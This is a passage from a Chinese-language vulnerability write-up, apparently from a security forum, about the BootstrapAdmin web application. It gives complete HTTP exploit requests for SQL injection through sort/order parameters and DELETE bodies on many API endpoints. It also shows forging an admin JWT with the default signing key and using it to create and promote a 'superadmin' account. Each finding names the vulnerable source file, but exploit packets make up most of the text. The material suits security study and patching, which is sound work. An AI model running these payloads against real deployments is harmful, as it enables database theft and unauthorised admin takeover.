Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8Gs8oXs1rxRKjEnWjDIDxNbJjshI1qzQp5CuMqbXtCMkdL2neNZavWmBhuthWZKWz33fafGSx248iRpmB60ypJVZklddoKZx_r5WUEYb6NlFnr8NezIO2vRdhVD2dAcFCSwZJTQffPO8V4Ua3hJC-90
Connection: close

{"Password":"123456"}
```

这个时候我们再使用`Admin/123456`即可登录管理员权限账户。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-834ab13ffe50db4e19c59ecb283b33c05a82a20c.png)

### 漏洞定位

我们先关注到`http://localhost:50852/api/Register/Admin`这个路径的处理函数  
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Controllers\Api\RegisterController.cs`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-aa55c648af8975ad5553c66a030f5532cc218c6c.png)

进入到`UserHelper.ResetPassword`函数  
`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\Helper\UserHelper.cs`  
这里进行了2个判断：

1. 对用户输入的用户名和密码进行标准检查
2. 判断是否是演示系统，如果是演示系统就不允许修改`Admin`和`User`这两个账户。这里不是演示系统。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-251e58943fbfbf6be6ec39357e25e61f91af61ce.png)

通过了两个判断后，进入到`ResetPassword`函数。  
`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\User.cs`  
这里先有一个根据传入的用户名判断是否有提交重置密码请求，这里必须要有重置密码请求记录。  
通过了这个判断之后，就是进行`db.Update`操作了。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-cdbcfa533f68686ed90402bc88b1663e82cfd5bc.png)

【后台】查询日志接口存在SQL注入
-----------------

权限：后台普通用户权限

### 漏洞利用

使用任意账号登录都能请求 `http://localhost:50852/api/Logs`接口  
此接口的`Sort`和`Order`没有使用Linq进行转义导致注入漏洞的产生。  
**基于报错注入：**  
`http://localhost:50852/api/Logs?OperateTimeEnd=&OperateTimeStart=2023-05-06&limit=1&offset=0&operateType=&order=concat(0x7e,database(),0x7e),3)&sort=updatexml(1,`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-d74f201e37340255657042fb4795563e294ba6ce.png)

请求包：

```python
GET /api/Logs?OperateTimeEnd=&OperateTimeStart=2023-05-06&limit=1&offset=0&operateType=&order=concat(0x7e,database(),0x7e),3)&sort=updatexml(1, HTTP/1.1
Host: localhost:50852
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8Gs8oXs1rxRKjEnWjDIDxNYIk8qTrVAchQMdNQDsqE0fBboelKrRDrSlcNGeSNFI1jNSivWc5b5t8tkI1SES8xumGS6HdMyCcTFdEqocP7y74P26iG_iKW6RRYrazzhQNkcvDfYzcxAzdbm-f5FqO88; .AspNetCore.Cookies=CfDJ8Gs8oXs1rxRKjEnWjDIDxNaE3CXKRjutQdTU9MI2xO1nRk7yd-9PgK41JPtnvxNoybJwZclKPosGkyWisjmmpaB2xJkLw04jWnB1ZpvrHYBNhbm02wR62IXpOdYVnmBRgSs7UrKRDnk-fAR9CRWNiYrLr5Dq9irg-R7uxSbuwu1A-eKvcQUsLvd_nvlRmExl_ay-3wo0v1rvUe1pwpbhyzzda5HLQbh0XOMmor5h0q66o9vFYO5dgBUGqYxpBidWCv0PoKzqGQeA_8dxsBolEctWPrQEKakod3mJ1HrIKQR1
Connection: close

```

**基于时间注入：**

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-2ab5c38531f78f6d330286a63e57c8d4a8cae029.png)

请求包：

```python
GET /api/Logs?OperateTimeEnd=&OperateTimeStart=2023-05-06&limit=1&offset=0&operateType=&order=sleep(10))&sort=if(1=2,1, HTTP/1.1
Host: localhost:50852
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8Gs8oXs1rxRKjEnWjDIDxNYIk8qTrVAchQMdNQDsqE0fBboelKrRDrSlcNGeSNFI1jNSivWc5b5t8tkI1SES8xumGS6HdMyCcTFdEqocP7y74P26iG_iKW6RRYrazzhQNkcvDfYzcxAzdbm-f5FqO88; .AspNetCore.Cookies=CfDJ8Gs8oXs1rxRKjEnWjDIDxNaE3CXKRjutQdTU9MI2xO1nRk7yd-9PgK41JPtnvxNoybJwZclKPosGkyWisjmmpaB2xJkLw04jWnB1ZpvrHYBNhbm02wR62IXpOdYVnmBRgSs7UrKRDnk-fAR9CRWNiYrLr5Dq9irg-R7uxSbuwu1A-eKvcQUsLvd_nvlRmExl_ay-3wo0v1rvUe1pwpbhyzzda5HLQbh0XOMmor5h0q66o9vFYO5dgBUGqYxpBidWCv0PoKzqGQeA_8dxsBolEctWPrQEKakod3mJ1HrIKQR1
Connection: close

```

更多利用方式请看：<https://yang1k.github.io/post/sql%E6%B3%A8%E5%85%A5%E4%B9%8Border-by%E6%B3%A8%E5%85%A5/>

### 漏洞定位

`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\Log.cs`  
在SQL语句拼接时`Sort`和`Order`没有使用 Linq 进行转义

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-a031ac28af01d380820d107b07dc143f72362ba0.png)

【后台】查询所有SQL日志信息接口存在SQL注入
------------------------

权限：后台普通用户权限

### 漏洞利用

`http://localhost:50852/api/SQL`  
`http://localhost:50852/api/SQL?offset=0&limit=20&UserName=&OperateTimeStart=2023-05-06&OperateTimeEnd=&order=concat(0x7e,database(),0x7e),3)&sort=updatexml(1,`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-ecc2ec005d1d788bbddd5c9eb9165517a312c351.png)

请求包：

```python
GET /api/SQL?offset=0&limit=20&UserName=&OperateTimeStart=2023-05-06&OperateTimeEnd=&order=concat(0x7e,database(),0x7e),3)&sort=updatexml(1, HTTP/1.1
Host: localhost:50852
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Admin/SQL
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8Gs8oXs1rxRKjEnWjDIDxNYIk8qTrVAchQMdNQDsqE0fBboelKrRDrSlcNGeSNFI1jNSivWc5b5t8tkI1SES8xumGS6HdMyCcTFdEqocP7y74P26iG_iKW6RRYrazzhQNkcvDfYzcxAzdbm-f5FqO88; .AspNetCore.Cookies=CfDJ8Gs8oXs1rxRKjEnWjDIDxNaE3CXKRjutQdTU9MI2xO1nRk7yd-9PgK41JPtnvxNoybJwZclKPosGkyWisjmmpaB2xJkLw04jWnB1ZpvrHYBNhbm02wR62IXpOdYVnmBRgSs7UrKRDnk-fAR9CRWNiYrLr5Dq9irg-R7uxSbuwu1A-eKvcQUsLvd_nvlRmExl_ay-3wo0v1rvUe1pwpbhyzzda5HLQbh0XOMmor5h0q66o9vFYO5dgBUGqYxpBidWCv0PoKzqGQeA_8dxsBolEctWPrQEKakod3mJ1HrIKQR1
Connection: close

```

### 漏洞定位

`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\DBLog.cs`  
在SQL语句拼接时`Sort`和`Order`没有使用 Linq 进行转义

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-f0bfb607ddd76e9af24b07ce0ebd1a4a096da244.png)

【后台】获得登录用户的分页数据接口存在SQL注入
------------------------

权限：后台普通用户权限

### 漏洞利用

`http://localhost:50852/api/Login`  
`http://localhost:50852/api/Login?&offset=0&limit=20&startTime=2023-05-06&endTime=&loginIp=&order=concat(0x7e,database(),0x7e),3)&sort=updatexml(1,`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-8d82182ebd363807cd91d4c72381e105bfb7d276.png)

请求包：

```python
GET /api/Login?&offset=0&limit=20&startTime=2023-05-06&endTime=&loginIp=&order=concat(0x7e,database(),0x7e),3)&sort=updatexml(1, HTTP/1.1
Host: localhost:50852
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Admin/Logins
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8Gs8oXs1rxRKjEnWjDIDxNYIk8qTrVAchQMdNQDsqE0fBboelKrRDrSlcNGeSNFI1jNSivWc5b5t8tkI1SES8xumGS6HdMyCcTFdEqocP7y74P26iG_iKW6RRYrazzhQNkcvDfYzcxAzdbm-f5FqO88; .AspNetCore.Cookies=CfDJ8Gs8oXs1rxRKjEnWjDIDxNaE3CXKRjutQdTU9MI2xO1nRk7yd-9PgK41JPtnvxNoybJwZclKPosGkyWisjmmpaB2xJkLw04jWnB1ZpvrHYBNhbm02wR62IXpOdYVnmBRgSs7UrKRDnk-fAR9CRWNiYrLr5Dq9irg-R7uxSbuwu1A-eKvcQUsLvd_nvlRmExl_ay-3wo0v1rvUe1pwpbhyzzda5HLQbh0XOMmor5h0q66o9vFYO5dgBUGqYxpBidWCv0PoKzqGQeA_8dxsBolEctWPrQEKakod3mJ1HrIKQR1
Connection: close

```

### 漏洞定位

`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\LoginUser.cs`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-3afb91d89295258405e8fb93954c4f2b8c893217.png)

【后台】查询用户访问分页数据接口存在SQL注入
-----------------------

权限：后台普通用户权限

### 漏洞利用

`http://localhost:50852/api/Traces`  
`http://localhost:50852/api/Traces?offset=0&limit=20&OperateTimeStart=2023-05-06&OperateTimeEnd=&AccessIP=&order=concat(0x7e,database(),0x7e),3)&sort=updatexml(1,`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-5c8cf6e388fc054090f8b3dec75422e886035463.png)

请求包：

```python
GET /api/Traces?offset=0&limit=20&OperateTimeStart=2023-05-06&OperateTimeEnd=&AccessIP=&order=concat(0x7e,database(),0x7e),3)&sort=updatexml(1, HTTP/1.1
Host: localhost:50852
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Admin/Traces
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8Gs8oXs1rxRKjEnWjDIDxNYIk8qTrVAchQMdNQDsqE0fBboelKrRDrSlcNGeSNFI1jNSivWc5b5t8tkI1SES8xumGS6HdMyCcTFdEqocP7y74P26iG_iKW6RRYrazzhQNkcvDfYzcxAzdbm-f5FqO88; .AspNetCore.Cookies=CfDJ8Gs8oXs1rxRKjEnWjDIDxNaE3CXKRjutQdTU9MI2xO1nRk7yd-9PgK41JPtnvxNoybJwZclKPosGkyWisjmmpaB2xJkLw04jWnB1ZpvrHYBNhbm02wR62IXpOdYVnmBRgSs7UrKRDnk-fAR9CRWNiYrLr5Dq9irg-R7uxSbuwu1A-eKvcQUsLvd_nvlRmExl_ay-3wo0v1rvUe1pwpbhyzzda5HLQbh0XOMmor5h0q66o9vFYO5dgBUGqYxpBidWCv0PoKzqGQeA_8dxsBolEctWPrQEKakod3mJ1HrIKQR1
Connection: close

```

### 漏洞定位

`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\Trace.cs`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-add98d7173fb5b439bb4bf5884489b9c37bdf5cf.png)

【后台】查询程序异常接口存在SQL注入
-------------------

权限：后台普通用户权限

### 漏洞利用

`http://localhost:50852/api/Exceptions`  
`http://localhost:50852/api/Exceptions?&offset=0&limit=20&StartTime=&EndTime=&order=concat(0x7e,database(),0x7e),3)&sort=updatexml(1,`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-8fd006a4c06aa92b46df077d8e3dff7f3c66e33e.png)

请求包：

```python
GET /api/Exceptions?&offset=0&limit=20&StartTime=&EndTime=&order=concat(0x7e,database(),0x7e),3)&sort=updatexml(1, HTTP/1.1
Host: localhost:50852
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Admin/Exceptions
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8Gs8oXs1rxRKjEnWjDIDxNYIk8qTrVAchQMdNQDsqE0fBboelKrRDrSlcNGeSNFI1jNSivWc5b5t8tkI1SES8xumGS6HdMyCcTFdEqocP7y74P26iG_iKW6RRYrazzhQNkcvDfYzcxAzdbm-f5FqO88; .AspNetCore.Cookies=CfDJ8Gs8oXs1rxRKjEnWjDIDxNaE3CXKRjutQdTU9MI2xO1nRk7yd-9PgK41JPtnvxNoybJwZclKPosGkyWisjmmpaB2xJkLw04jWnB1ZpvrHYBNhbm02wR62IXpOdYVnmBRgSs7UrKRDnk-fAR9CRWNiYrLr5Dq9irg-R7uxSbuwu1A-eKvcQUsLvd_nvlRmExl_ay-3wo0v1rvUe1pwpbhyzzda5HLQbh0XOMmor5h0q66o9vFYO5dgBUGqYxpBidWCv0PoKzqGQeA_8dxsBolEctWPrQEKakod3mJ1HrIKQR1
Connection: close

```

### 漏洞定位

`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\Exceptions.cs`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-0545afc84ed4eea68a12873e4d184be0dae8eb3b.png)

【后台】删除用户接口存在SQL注入
-----------------

权限：后台管理员用户权限

### 漏洞利用

`http://localhost:50852/api/Users`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-d397d140374e2b25f27495ed813f9d2da77cdf40.png)

请求包：

```python
DELETE /api/Users HTTP/1.1
Host: localhost:50852
Content-Length: 47
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:50852
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Admin/Users
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8Gs8oXs1rxRKjEnWjDIDxNYIk8qTrVAchQMdNQDsqE0fBboelKrRDrSlcNGeSNFI1jNSivWc5b5t8tkI1SES8xumGS6HdMyCcTFdEqocP7y74P26iG_iKW6RRYrazzhQNkcvDfYzcxAzdbm-f5FqO88; .AspNetCore.Cookies=CfDJ8Gs8oXs1rxRKjEnWjDIDxNaE3CXKRjutQdTU9MI2xO1nRk7yd-9PgK41JPtnvxNoybJwZclKPosGkyWisjmmpaB2xJkLw04jWnB1ZpvrHYBNhbm02wR62IXpOdYVnmBRgSs7UrKRDnk-fAR9CRWNiYrLr5Dq9irg-R7uxSbuwu1A-eKvcQUsLvd_nvlRmExl_ay-3wo0v1rvUe1pwpbhyzzda5HLQbh0XOMmor5h0q66o9vFYO5dgBUGqYxpBidWCv0PoKzqGQeA_8dxsBolEctWPrQEKakod3mJ1HrIKQR1
Connection: close

["updatexml(1,concat(0x7e,database(),0x7e),3)"]
```

### 漏洞定位

`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\User.cs`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-09810dc34830286aeb7b5fb19093dfd735172a29.png)

【后台】删除角色表接口存在SQL注入
------------------

权限：后台管理员用户权限

### 漏洞利用

`http://localhost:50852/api/Roles`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-253a6b9abd0f178d369e807b5cdfb9eaabd79d82.png)

请求包：

```python
DELETE /api/Roles HTTP/1.1
Host: localhost:50852
Content-Length: 47
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:50852
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Admin/Roles
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8Gs8oXs1rxRKjEnWjDIDxNYIk8qTrVAchQMdNQDsqE0fBboelKrRDrSlcNGeSNFI1jNSivWc5b5t8tkI1SES8xumGS6HdMyCcTFdEqocP7y74P26iG_iKW6RRYrazzhQNkcvDfYzcxAzdbm-f5FqO88; .AspNetCore.Cookies=CfDJ8Gs8oXs1rxRKjEnWjDIDxNaE3CXKRjutQdTU9MI2xO1nRk7yd-9PgK41JPtnvxNoybJwZclKPosGkyWisjmmpaB2xJkLw04jWnB1ZpvrHYBNhbm02wR62IXpOdYVnmBRgSs7UrKRDnk-fAR9CRWNiYrLr5Dq9irg-R7uxSbuwu1A-eKvcQUsLvd_nvlRmExl_ay-3wo0v1rvUe1pwpbhyzzda5HLQbh0XOMmor5h0q66o9vFYO5dgBUGqYxpBidWCv0PoKzqGQeA_8dxsBolEctWPrQEKakod3mJ1HrIKQR1
Connection: close

["updatexml(1,concat(0x7e,database(),0x7e),3)"]
```

### 漏洞定位

`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\Role.cs`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-5de24e20b33ac2d51e58a6c091fe0e74deb24723.png)

【后台】删除群组信息存在SQL注入
-----------------

权限：后台管理员用户权限

### 漏洞利用

`http://localhost:50852/api/Groups`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-f91f20008f5419da246b527d544a6f44726cac52.png)

请求包：

```python
DELETE /api/Groups HTTP/1.1
Host: localhost:50852
Content-Length: 47
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:50852
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Admin/Groups
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8Gs8oXs1rxRKjEnWjDIDxNYIk8qTrVAchQMdNQDsqE0fBboelKrRDrSlcNGeSNFI1jNSivWc5b5t8tkI1SES8xumGS6HdMyCcTFdEqocP7y74P26iG_iKW6RRYrazzhQNkcvDfYzcxAzdbm-f5FqO88; .AspNetCore.Cookies=CfDJ8Gs8oXs1rxRKjEnWjDIDxNaE3CXKRjutQdTU9MI2xO1nRk7yd-9PgK41JPtnvxNoybJwZclKPosGkyWisjmmpaB2xJkLw04jWnB1ZpvrHYBNhbm02wR62IXpOdYVnmBRgSs7UrKRDnk-fAR9CRWNiYrLr5Dq9irg-R7uxSbuwu1A-eKvcQUsLvd_nvlRmExl_ay-3wo0v1rvUe1pwpbhyzzda5HLQbh0XOMmor5h0q66o9vFYO5dgBUGqYxpBidWCv0PoKzqGQeA_8dxsBolEctWPrQEKakod3mJ1HrIKQR1
Connection: close

["updatexml(1,concat(0x7e,database(),0x7e),3)"]
```

### 漏洞定位

`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\Group.cs`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-c237f29ea82b3236f58b46d56d5d83d927eef30c.png)

【后台】删除字典中的数据存在SQL注入
-------------------

权限：后台管理员用户权限

### 漏洞利用

`http://localhost:50852/api/Dicts`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-eeb1488bda09e7410f63cc1d8c23206c7c797176.png)

请求包：

```python
DELETE /api/Dicts HTTP/1.1
Host: localhost:50852
Content-Length: 47
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:50852
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Admin/Dicts
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8Gs8oXs1rxRKjEnWjDIDxNYIk8qTrVAchQMdNQDsqE0fBboelKrRDrSlcNGeSNFI1jNSivWc5b5t8tkI1SES8xumGS6HdMyCcTFdEqocP7y74P26iG_iKW6RRYrazzhQNkcvDfYzcxAzdbm-f5FqO88; .AspNetCore.Cookies=CfDJ8Gs8oXs1rxRKjEnWjDIDxNaE3CXKRjutQdTU9MI2xO1nRk7yd-9PgK41JPtnvxNoybJwZclKPosGkyWisjmmpaB2xJkLw04jWnB1ZpvrHYBNhbm02wR62IXpOdYVnmBRgSs7UrKRDnk-fAR9CRWNiYrLr5Dq9irg-R7uxSbuwu1A-eKvcQUsLvd_nvlRmExl_ay-3wo0v1rvUe1pwpbhyzzda5HLQbh0XOMmor5h0q66o9vFYO5dgBUGqYxpBidWCv0PoKzqGQeA_8dxsBolEctWPrQEKakod3mJ1HrIKQR1
Connection: close

["updatexml(1,concat(0x7e,database(),0x7e),3)"]
```

### 漏洞定位

`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\Dict.cs`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-8071866098aa8bc0966b23777d2d4a6c0432fdef.png)

【前台】任意JWT伪造
-----------

### 漏洞利用

目前版本是不允许我们未授权访问该接口的（在旧版本是可以的），该接口用来查询当前用户情况。  
`http://localhost:50852/api/Users?search=&sort=RegisterTime&order=desc&offset=0&limit=20&name=&displayName=&_=1683423761467`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-bc5875d3c8dc18ad1cf5c3d251597a2844e18441.png)

默认的 SecurityKey 为 `BootstrapAdmin-V1.1`  
我们可以到`https://jwt.io/`伪造Cookie，填入SecurityKey并修改Data里面的 exp（过期时间）即可。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-f16da4dcb0996e539801c36da64bad2f0b027528.png)

```python
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IkFkbWluIiwibmJmIjoxNjgzMzgzNTA1LCJleHAiOjE2OTMzODM1MDUsImlhdCI6MTY4MzM4MzUwNSwiaXNzIjoiQkEiLCJhdWQiOiJhcGkifQ.DvpSS-mW4nmKaTf-NFMQHgWO2XhAP5SFX-7Ec2uV3nQ
```

请求时携带这个请求头再次访问即可获取用户信息，此时我们没有登录任何账户。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-45e26d9430fbf83862e9fdb6731b53dc3208143b.png)

请求包：

```python
GET /api/Users?search=&sort=RegisterTime&order=desc&offset=0&limit=20&name=&displayName=&_=1683423761467 HTTP/1.1
Host: localhost:50852
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Admin/Users
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: 
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IkFkbWluIiwibmJmIjoxNjgzMzgzNTA1LCJleHAiOjE2OTMzODM1MDUsImlhdCI6MTY4MzM4MzUwNSwiaXNzIjoiQkEiLCJhdWQiOiJhcGkifQ.DvpSS-mW4nmKaTf-NFMQHgWO2XhAP5SFX-7Ec2uV3nQ
Connection: close

```

使用同样的手法，创建用户

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-5e1210e10e9c0b44472eb37e41f846f6b0670a8f.png)

请求包：

```python
POST /api/Users HTTP/1.1
Host: localhost:50852
Content-Length: 103
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:50852
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Admin/Users
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IkFkbWluIiwibmJmIjoxNjgzMzgzNTA1LCJleHAiOjE2OTMzODM1MDUsImlhdCI6MTY4MzM4MzUwNSwiaXNzIjoiQkEiLCJhdWQiOiJhcGkifQ.DvpSS-mW4nmKaTf-NFMQHgWO2XhAP5SFX-7Ec2uV3nQ
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: 
Connection: close

{"Id":"","UserName":"superadmin","Password":"123456","DisplayName":"superadmin","NewPassword":"123456"}
```

再次请求就可以看到账户创建成功了。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-975fb65a044af2c630fdf4b7663d930a10e3e1bf.png)

然后给这个账户增加管理员权限，同样使用JWT验证。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-68d196e38769358565aa9af32a64be68ef327266.png)

请求包：

```python
PUT /api/Users/9?type=role HTTP/1.1
